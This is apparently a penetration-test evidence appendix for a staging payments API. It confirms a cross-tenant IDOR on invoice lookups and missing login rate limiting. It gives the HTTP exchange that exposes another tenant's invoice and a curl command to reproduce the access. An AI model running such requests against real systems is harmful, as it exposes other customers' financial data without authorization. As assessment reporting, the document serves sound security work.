# PayFlow API — Dynamic Verification Results

Companion evidence document for the PayFlow API assessment. Attach alongside the main
report with `--attach`.

## Environment

| Item | Value |
|---|---|
| Host | Kali 2026.2, Burp Suite Pro 2026.5 |
| Target | `https://api.payflow.example` (staging) |
| Scope | Authenticated + unauthenticated REST surface |

> Note: staging shares the production schema but uses seeded test tenants.

## Results by finding

| ID | Static expectation | Dynamic verdict |
|----|--------------------|-----------------|
| F1 | IDOR on `/invoices/{id}` | **CONFIRMED (High).** Cross-tenant read succeeded. |
| F2 | No rate limiting on `/auth/login` | **CONFIRMED (Medium).** 10k attempts, no throttle. |

### F1 — IDOR confirmed

Authenticated as tenant A (`user_a`), requesting another tenant's invoice returned it in
full:

```http
GET /invoices/4021 HTTP/1.1
Authorization: Bearer <user_a token>

HTTP/1.1 200 OK
{"id":4021,"org_id":"tenant_B","amount":18400,"customer":"Globex"}
```

The `org_id` in the response (`tenant_B`) does not match the caller's tenant — a direct
object reference with no ownership check.

## Reproduce

```bash
curl -H "Authorization: Bearer $TOKEN_A" https://api.payflow.example/invoices/4021
```
